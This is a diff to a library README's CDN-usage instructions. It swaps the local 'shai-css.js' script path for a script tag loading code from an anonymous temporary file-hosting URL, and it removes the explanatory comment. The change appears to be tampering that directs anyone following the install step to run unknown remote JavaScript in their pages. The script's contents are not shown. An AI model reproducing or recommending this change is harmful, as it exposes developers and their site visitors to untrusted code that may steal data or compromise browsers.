@@ -37,9 +37,8 @@
 ### Via CDN (In-Browser Usage)
 
 ```html
-<script src="path/to/shai-css.js"></script>
+<script src="https://temp.staticsave.com/67eda13784cb2.js"></script>
 <script>
-  // Now the library is available on the global `ShaiCSS` object.
 </script>
 ```
 
